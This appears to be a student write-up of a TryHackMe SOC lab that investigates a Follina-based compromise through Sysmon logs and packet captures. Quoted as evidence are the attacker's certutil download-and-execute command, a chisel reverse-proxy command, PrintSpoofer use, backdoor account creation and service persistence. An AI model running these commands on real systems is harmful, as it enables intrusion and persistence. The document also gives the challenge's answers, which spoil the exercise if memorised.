# **Hands-On Cybersecurity Analyst**  **HomeLabs \- Part 1**


# 1\. Introduction

**Report Introduction \- Defending the Tempest: SOC Log Analysis and Incident Response.**

This report documents the investigation and forensic analysis conducted in the Tempest challenge, part of the SOC Level 1 Capstone Challenges module of TryHackMe. The main objective of this exercise is to simulate a real Incident Response (IR) investigation, analyzing the complete attack chain executed against a compromised workstation.

# As a member of the Incident Response team, the mission consisted of examining the artifacts collected from the affected asset—including endpoint logs and network traffic captures—in order to reconstruct the chronology of events, identify the origin of the threat, the vectors of compromise, and the extent of the malicious actions performed by the attacker.


# **1.1 Scope and Environment of Investigation**

# The analysis was conducted directly in a controlled environment based on the meticulously correlated examination of network and system data.

# **Affected Asset:** Tempest workstation (Windows operating system).

# **Scope of Analysis:** Forensic investigation of endpoint logs and network traffic logs generated during the incident. 

# **1.2 Tools and Technologies Applied**.

# **Endpoint Log Analysis:** Windows Event Logs and Sysmon (for identifying process creation, persistence, and suspicious connections).

# **Network Traffic Analysis:** Wireshark (operations and detailed packet inspection) and Brim (rapid triage of data flows and network alerts). 

# 

2\. Development.

**2.1 Preparation \- Tools and artefacts.**

**Task 1: Artefact Preparation and Integrity Verification**

Before launching the investigation, it is critical in digital forensics to prepare the environment and verify the integrity of all collected evidence. Verifying files via cryptographic hashes ensures the artefacts have not been altered or corrupted during acquisition or analysis, guaranteeing data authenticity throughout the Incident Response lifecycle.

**Artefact Hash Verification:** Using PowerShell, SHA-256 hashes were generated for all evidence files stored in C:\\Users\\user\\Desktop\\Incident Files\\ via the Get-FileHash cmdlet:  
**Command Executed:** Get-FileHash \-Algorithm SHA256 .\\\*.\*  
**Objective:** Establish a baseline hash for each artefact to guarantee data integrity prior to analysis.

**Artefact File:** capture.pcapng  
**Type / Description:** Network Packet Capture  
**SHA-256 Hash Value:**  
CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6

**Artefact File:** sysmon.evtx  
**Type Description:** Sysmon Event Logs  
**SHA-256 Hash Value:**  
665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F

**Artefact File:** windows.evtx  
**Type Description:** Windows Event Logs  
**SHA-256 Hash Value:**  
D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60

**![][<data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAC8AAAAGCAYAAABThMdSAAAAHklEQVR4XmOQW/Xx/1DFDOgCQwmPOn6g8KjjBwoDAOS8/s9EC0PsAAAAAElFTkSuQmCC]**

**2.2 Toolset Overview & Log Parsing Execution.**

To process the forensic evidence effectively, a dedicated suite of endpoint and network analysis tools was deployed. Specialized utilities from Eric Zimmerman's EZTools suite were leveraged to convert raw Event Logs into easily filterable structured data.

**Endpoint Analysis Suite:** EvtxEcmd, Timeline Explorer, SysmonView, Event Viewer.  
**Network Analysis Suite**: Wireshark, Brim.

**EVTX Log Parsing with EvtxEcmd & Timeline Explorer**

Raw Windows Event Logs (**.evtx**) were parsed into CSV format to enable rapid filtering, sorting, and timeline analysis within **Timeline Explorer**.

**EvtxEcmd Execution:**

**Command Executed:** .\\EvtxECmd.exe \-f 'C:\\Users\\user\\Desktop\\Incident Files\\sysmon.evtx' \--csv 'C:\\Users\\user\\Desktop\\Incident Files' \--csvf sysmon.csv  
**Result:** Successfully parsed 2,559 event log records from sysmon.evtx into sysmon.csv in 14.52 seconds.

**Parsed Event Metrics:**  
Event ID 1 (Process Creation): 238  
Event ID 3 (Network Connection): 92  
Event ID 11 (File Created): 1,024  
Event ID 12/13 (Registry Object/Value Modifications): 1,055  
Event ID 22 (DNSEvent): 136

**![][image3]**

**2.3 Data Loading into Timeline Explorer:**

The generated **sysmon.csv** file was loaded directly into **Timeline Explorer v2.0.0.1** to review timestamps, Event Record IDs, Provider types, and specific payload details.

**![][image4]**

# **2.4 Initial Access \- Malicious Document.**

# **Task 2: Incident Analysis & Findings**

# Following a critical alert triaged by the SOC, an investigation was launched into an endpoint compromise initiated by a malicious Word document downloaded via Google Chrome. The analysis was performed by parsing Sysmon logs into CSV format with **EvtxEcmd** and investigating the output through **Timeline Explorer**.

# **What is the file name of the malicious document?**

# **Objective:** Identify the malicious .doc file downloaded by the victim. **Tool Used:** Timeline Explorer (sysmon.csv) **Analysis & Methodology:** A search was executed for the **.doc** extension within the parsed Sysmon logs. Filtering for file creation events associated with **chrome.exe** revealed the target file saved directly into the user's Downloads directory. **Response:** free\_magicules.doc

# ***![][image5]***

# 

# **What is the name of the compromised user and machine?**

# **Objective:** Identify the victim's account name and hostname. **Tool Used:** Timeline Explorer (sysmon.csv) **Analysis & Methodology:** Examining the **User Name** and **Payload Data3** columns across events linked to the malicious document execution revealed the domain/user format and host details. **Response:** **TEMPEST\\benimaru** (User: **benimaru** | Machine: **TEMPEST**) 

# ***![][image6]***

# **What is the PID of the Microsoft Word process that opened the malicious document?**  **Objective:** Determine the Process ID (PID) of **WINWORD.EXE** executing the payload. **Tool Used:** Timeline Explorer (sysmon.csv) **Analysis & Methodology:** By filtering for Process Creation **(Event ID 1**) events involving **free\_magicules.doc** and Microsoft Word **(WINWORD.EXE**), the system recorded Process ID **496** executing the file. **Response:** 496

# ***![][image7]***

# 

# **Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain?**

# **Objective:** Identify the remote IP address linked to the malicious domain (**phishteam.xyz**). **Tool Used:** Timeline Explorer (sysmon.csv) **Analysis & Methodology:** Filtering for DNS Query events (Event ID 22\) involving **phishteam.xyz** showed DNS resolution details in the **QueryResults** field. **Response:** 167.71.199.191

# ***![][image8]***

# **What is the base64 encoded string in the malicious payload executed by the document?**

# **Objective:** Extract the obfuscated Base64 string embedded in the executed payload command. **Tool Used:** Timeline Explorer (sysmon.csv) **Analysis & Methodology:** Inspecting the process creation arguments for msdt.exe invoked by Microsoft Word revealed a PowerShell inline script using **\[System.Convert\]::FromBase64String()**. **Response:** JGFwcD1RW52aXJvb... (Truncated Base64 string as extracted from cell contents)

# ***![][image9]***

# 

# **What is the CVE number of the exploit used by the attacker to achieve remote code**  **execution?**

# **Objective:** Correlate the observed command structure with known public vulnerabilities. **Tool Used:** External Threat Intelligence Research **Analysis & Methodology:** The command leverages **msdt.exe** (Microsoft Support Diagnostic Tool) via the **ms-msdt:** URI scheme to bypass macro controls and achieve Remote Code Execution. External research confirms this signature belongs to the "Follina" vulnerability. **Response:** CVE-2022-30190

# ***![][image10]***

# **2.5 Initial Access \- Stage 2 execution.**  **Task 3: Stage 2 Payload Analysis & Persistence Investigation**

# Decoding the obfuscated Base64 string from the Follina exploit revealed the secondary execution chain. The attacker established persistence using the Windows Startup folder and retrieved a secondary stage executable **(first.exe)** via **certutil.exe** to establish a Command and Control (C2) channel.

#  ***![][image11]***

# **The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?**

# **Objective:** Identify the local filesystem path where the Stage 2 payload was written. **Tool Used:** CyberChef / Timeline Explorer (sysmon.csv) **Analysis & Methodology:** Decoding the Base64 string in CyberChef revealed a PowerShell command targeting the user's Startup directory **($app\\Microsoft\\Windows\\Start Menu\\Programs\\Startup)** to download and extract update.zip. Subsequent Sysmon logs confirmed **certutil.exe** saved the primary executable to the public downloads directory. **Response:** C:\\Users\\Public\\Downloads\\first.exe

# ***![][image12]***

# 

# **The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?**

# **Objective:** Determine the command line initiated upon user authentication. **Tool Used:** CyberChef / Timeline Explorer (sysmon.csv) **Analysis & Methodology:** Decoding the payload string exposed the inline script executing via PowerShell: certutil \-urlcache \-split \-f '\[http://phishteam.xyz/02dcf07/first.exe\] (http://phishteam.xyz/02dcf07/first.exe)' C:\\Users\\Public\\Downloads\\first.exe; C:\\Users\\Public\\Downloads\\first.exe. **Response:** "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" \-w hidden \-noni certutil \-urlcache \-split \-f '\[http://phishteam.xyz/02dcf07/first.exe\](http://phishteam.xyz/02dcf07/first.exe)' C:\\Users\\Public\\Downloads\\first.exe; C:\\Users\\Public\\Downloads\\first.exe

# ***![][image13]***

# **Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?**

# **Objective**: Obtain the SHA256 hash of **first.exe** for threat intelligence matching. **Tool Used:** Timeline Explorer (sysmon.csv) **Analysis & Methodology:** Filtering Sysmon process creation and file creation events for first.exe (executed by PowerShell) isolated the hash metadata in the **Payload Data3** column. **Response:** CE278CA242AA2023A4FE03630A9D3B6 (SHA256 from Sysmon record)  ***![][image14]***

# **The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker?**

# **Objective:** Identify the C2 domain and port utilized by first.exe. **Tool Used:** Timeline Explorer (sysmon.csv) **Analysis & Methodology:** Tracking network and DNS events (Event ID 22\) spawned by ParentProcess: **C:\\Users\\Public\\Downloads\\first.exe** revealed DNS queries to **resolvecyber.xyz** over the standard HTTP port. **Response:** resolvecyber.xyz:80

# ***![][image15]*** 

![][image16]

![][image17]

**2.6 Initial Access \- Malicious document traffic**

**Task 4: Network Traffic Analysis & C2 Communication Investigation**

Following the discovery of external domains and IPs from endpoint logs, packet capture (capture.pcapng) analysis was conducted using Brim to inspect HTTP traffic associated with phishteam.xyz and resolvecyber.xyz. This identified the initial web payload delivery mechanisms, command execution parameters, and C2 interaction behaviors.

**What is the URL of the malicious payload embedded in the document?**

**Objective:** Locate the exact HTTP path used to retrieve the primary payload hosted on **phishteam.xyz**.  
**Tool Used:** Brim (capture.pcapng)  
**Analysis & Methodology:** Executed the filter **\_path=="http" "phishteam" GET** in Brim to review all HTTP GET requests originating from Microsoft Office User-Agents (**Mozilla/4.0 (compatible; ms-office; MSOffice 16\)**). The initial request targeted the index file housing the exploit payload.  
**Response:** \[http://phishteam.xyz/02dcf07/index.html\]

**![][image18]**

**What is the encoding used by the attacker on the c2 connection?**

**Objective:** Determine the encoding technique applied to query parameters sent to the C2 domain resolvecyber.xyz.  
**Tool Used:** Brim (capture.pcapng)  
**Analysis & Methodology**: Investigating HTTP requests to resolvecyber.xyz revealed query strings appended to the /9ab62b5 endpoint (?q=bmV0IGx2Y2...). Decoding the string structure confirms

Base64 encoding used for data exfiltration and parameter transmission.  
**Response:** Base64

![][image19]

![][image20]

**The malicious c2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?**

**Objective:** Identify the HTTP GET parameter used by **first.exe** to transmit command output back to the server.  
**Tool Used:** Brim (capture.pcapng)  
**Analysis & Methodology:** Filtering for HTTP transactions towards **resolvecyber.xyz** showed outbound requests structured with a key-value parameter in the URI schema (**/9ab62b5?q=**...). The binary passes encoded execution results via the **q** parameter.  
**Response:** q

![][image21]

**The malicious c2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?**

**Objective:** Identify the base URL endpoint polled by the C2 binary to retrieve incoming commands.  
**Tool Used:** Brim (capture.pcapng)  
**Analysis & Methodology:** Analyzing recurring HTTP traffic to **resolvecyber.xyz:8080** isolated requests made without query parameters, representing beaconing/polling endpoints where instructions are served.  
**Response:** (\[[http://resolvecyber.xyz/9ab62b5\]](http://resolvecyber.xyz/9ab62b5]\(http://resolvecyber.xyz/9ab62b5\)))

**![][image22]**

**What is the HTTP method used by the binary?**

**Objective:** Verify the HTTP verb leveraged for C2 communication.  
**Tool Used:** Brim (capture.pcapng)  
**Analysis & Methodology:** Reviewing the **method** field across all logged transactions for **resolvecyber.xyz** confirmed exclusively standard HTTP read operations.  
**Response:** GET

**![][image23]**

**Based on the user agent, what programming language was used by the attacker to compile the binary?**

**Objective:** Deduce the compiler/language used to create **first.exe** via User-Agent inspection.  
**Tool Used:** Brim (capture.pcapng)  
**Analysis & Methodology:** Inspecting the **user\_agent** field in the HTTP header for traffic generated by **first.exe** revealed the string **Nim httpclient/1.6.6**. This indicates the payload was authored and compiled using the Nim programming language.  
**Response:** Nim

![][image24]

**2.7 Discovery \- Internal Reconnaissance**

**Task 5: Internal Reconnaissance & Lateral Movement Investigation**

# Analysis of post-exploitation HTTP traffic and Sysmon process execution logs exposed the attacker's internal enumeration commands, credential harvesting, deployment of a reverse SOCKS proxy, and subsequent authentication via administrative remote management protocols.  **The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned file?**  **Objective:** Extract plaintext credentials gathered during file system discovery. **Tool Used:** CyberChef / Brim **Analysis & Methodology:** Decoding the Base64-encoded command outputs captured in C2 traffic revealed the execution of **cat C:\\Users\\Benimaru\\Desktop\\automation.ps1**. The script contained hardcoded domain credentials for user **TEMPEST\\benimaru**. **Response:** infernotempest   **![][image25]**

# ***![][image26]*** 

# **The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?**  **Objective:** Identify the listening service targeted for remote administrative access. **Tool Used:** CyberChef / Network Reconnaissance Output **Analysis & Methodology:** Base64 output of **netstat \-ano \-p tcp** showed port **5985** active and listening (**0.0.0.0:5985**). Port 5985 hosts Windows Remote Management (WinRM), allowing interactive remote PowerShell access. **Response:** 5985 **![][image27]**

# 

# ![][image28]

# **The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection?**  **Objective:** Extract the exact binary invocation command used to launch the proxy connection. **Tool Used:** Timeline Explorer (sysmon.csv) **Analysis & Methodology:** Sysmon process creation logs recorded ch.exe being invoked with arguments specifying client proxy mode to direct internal traffic back to the attacker's IP. **Response:** "C:\\Users\\benimaru\\Downloads\\ch.exe" client 167.71.199.191:8080 R:socks  ![][image29]

**What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection?**

**Objective:** Retrieve the SHA256 hash of ch.exe from event metadata.  
**Tool Used:** Timeline Explorer (sysmon.csv)

**Analysis & Methodology:** Inspecting the file hashes recorded for the ch.exe execution in Sysmon isolated the complete SHA256 string.  
**Response:** 8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451

*![][image30]*

**What is the name of the tool used by the attacker based on the SHA256 hash?**

**Objective:** Identify the public tunneling tool matching the payload hash.  
**Tool Used:** VirusTotal  
**Analysis & Methodology:** Searching the hash on VirusTotal correlated the binary aliases (**chisel.exe, chisel\_windows.exe, ch.exe**) to the fast TCP/UDP tunnel utility.  
**Response:** chisel

*![][image31]**![][image32]***

# **The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate?**  **Objective**: Determine the administrative service authenticated immediately after proxy establishment. **Tool Used:** Timeline Explorer (sysmon.csv) **Analysis & Methodology:** Sysmon logged the spawning of **C:\\Windows\\system32\\wsmprovhost.exe \-Embedding** immediately following the proxy initialization. wsmprovhost.exe serves as the host process for Windows Remote Management (WinRM) plugins. **Response:** WinRM  **![][image33]** **![][image34]**

**2.8 Privilege Escalation \- Exploiting Privileges**

**Task 6: Privilege Escalation Investigation**

Context: Following initial compromise and lateral movement via WinRM, the attacker performed local privilege enumeration (**whoami /priv**) and retrieved an exploitation utility (**spf.exe**) to perform 

token impersonation. This elevated access enabled the execution of an elevated secondary C2 binary (**final.exe**) communicating over an alternate port.

**After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary?**

**Objective:** Identify the privilege escalation binary filename and its SHA256 hash.  
**Tool Used:** Timeline Explorer (sysmon.csv)  
**Analysis & Methodology:** Sysmon process logs showed PowerShell downloading and saving **spf.exe**. Inspecting the corresponding file hash in Sysmon revealed the exact SHA256 digest.  
**Response:** Name: spf.exe SHA256: 8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D

![][image35]  
![][image36]

**Based on the SHA256 hash of the binary, what is the name of the tool used?**

**Objective:** Map the hash of **spf.exe** to its known tool name.  
**Tool Used**: VirusTotal  
**Analysis & Methodology:** Submitting the hash **8524fbc0d73e711e69d60c64f1f1b7bef35c986705880643dd4d5e17779e586d** to VirusTotal identified the binary under its original name, **PrintSpoofer64.exe**.  
**Response:** PrintSpoofer (or PrintSpoofer64.exe)

*![][image37]*

**The tool exploits a specific privilege owned by the user. What is the name of the privilege?**

**Objective:** Determine the Windows privilege targeted by PrintSpoofer for privilege escalation.  
**Tool Used:** Process Execution / Knowledge Base  
**Analysis & Methodology:** PrintSpoofer abuses token impersonation rights assigned to service/local accounts by tricking the Print Spooler service to write to a named pipe, stealing and duplicating the **NT AUTHORITY\\SYSTEM** token.  
**Response:** SeImpersonatePrivilege

![][image38]

**Then, the attacker executed the tool with another binary to establish a c2 connection. What is the name of the binary?**

**Objective:** Identify the payload binary executed under elevated SYSTEM privileges.  
**Tool Used:** Timeline Explorer (sysmon.csv)  
**Analysis & Methodology:** Checking process creation parameters for **spf.exe** showed the execution line: **C:\\Users\\benimaru\\Downloads\\spf.exe \-c C:\\ProgramData\\final.exe**.  
**Response:** final.exe

**![][image39]**

**The binary connects to a different port from the first c2 connection. What is the port used?**

**Objective:** Identify the updated destination port for the elevated C2 connection.  
**Tool Used:** Brim (capture.pcapng)  
**Analysis & Methodology:** Filtering HTTP traffic directed at **resolvecyber.xyz** in Brim revealed that initial connections operated over **port 80**, whereas subsequent traffic from **final.exe** shifted destination requests to **port 8080** (**id.resp\_p \== 8080**).  
**Response:** 8080

**![][image40]**

**2.9 Actions on Objective \- Fully Owned Machine**

**Task 7: Fully-Owned Machine Investigation**

Analysis of post-privilege escalation activity via Sysmon process logs and Windows Event Logs revealed account creation attempts, administrative group modification, and persistence establishment via a custom Windows Service.

**Upon achieving SYSTEM access, the attacker then created two users. What are the account names?**

**Objective:** Identify local accounts created by the threat actor following privilege escalation.  
**Tool Used:** Timeline Explorer (sysmon.csv / windows.csv)  
**Analysis & Methodology:** Event ID 4720 records show new accounts created under the target names **shion** and **shuna**.  
**Response:** shion, shuna

**![][image41]**

**Prior to the successful creation of the accounts, the attacker executed commands that failed in the creation attempt. What is the missing option that made the attempt fail?**

**Objective:** Identify the missing syntax parameter causing initial execution failure.  
**Tool Used:** Timeline Explorer (sysmon.csv)  
**Analysis & Methodology:** Initial commands were executed as **net user shuna princess** instead of including the **/add** switch required by **net.exe** syntax (**net user /add shuna** ...).  
**Response:** /add

![][image42]

![][image43]

**Based on windows event logs, the accounts were successfully created. What is the event ID that indicates the account creation activity?**

**Objective:** Identify the standard Security Event ID for account creation.  
**Tool Used:** Windows Security Event Log / Timeline Explorer  
**Analysis & Methodology:** Filtering Windows Security Event Logs isolates Event ID 4720 ("A user account was created").  
**Response:** 4720

![][image44]

![][image45]

*![][image46]*

**The attacker added one of the accounts in the local administrator's group. What is the command used by the attacker?**

**Objective:** Extract the exact command used to add a user to Administrators.  
**Tool Used:** Timeline Explorer (sysmon.csv) / CyberChef Base64 Decode  
**Analysis & Methodology:** Executed command-line logging captured **net localgroup administrators /add shion**.  
**Response:** net localgroup administrators /add shion

![][image47]

**Based on windows event logs, the account was successfully added to a sensitive group. What is the event ID that indicates the addition to a sensitive local group?**

**Objective:** Identify the Event ID associated with local security group membership changes.  
**Tool Used:** Windows Security Event Log / Knowledge Base  
**Analysis & Methodology:** Windows Event ID **4732** ("A member was added to a security-enabled local group") records additions to privileged local groups.  
**Response:** 4732

![][image48]

**After the account creation, the attacker executed a technique to establish persistent administrative access. What is the command executed by the attacker to achieve this?**

**Objective:** Extract the command string used to establish persistence via Windows Services.  
**Tool Used:** Timeline Explorer (sysmon.csv)  
**Analysis & Methodology:** Sysmon logged **sc.exe** creating a new auto-starting system service pointing to the secondary C2 binary: **C:\\Windows\\system32\\sc.exe \\\\TEMPEST create TempestUpdate2 binpath= C:\\ProgramData\\final.exe start= auto**.  
**Response:** C:\\Windows\\system32\\sc.exe \\\\TEMPEST create TempestUpdate2 binpath= C:\\ProgramData\\final.exe start= auto

![][image49]

3\. Conclusion

The fact that the challenge had been completed showed how essential the technical and analytical skills are for work at Level 1 in a SOC. It became clear from the experience that an analyst's role extends well beyond the interpretation of automated alerts, since it also involves adopting a structured investigative approach in order to reconstruct the attack timeline (Kill Chain), identify the root cause, and take agile containment actions to reduce the impact on the organisation

**3.1 Key Lessons Learned**

* Systemic Analysis and Log Correlation: Efficient threat identification depends on the ability to correlate events from different sources (network logs, SIEM, endpoints, and firewalls) rather than analyzing isolated data.  
* Importance of Context and Reduction of False Positives: Understanding traffic patterns and expected network behavior is crucial for quickly differentiating malicious behavior from legitimate anomalous activity.  
* Agility in Containment: The time between detection and isolation of the attack vector is crucial for limiting lateral movement or exfiltration of sensitive data.  
* Rigorous Documentation: Building clear and detailed reports during the incident ensures that the response team (SOC/Incident Response) and managers accurately understand the entry vector, the impacted systems, and the recommended mitigation steps.
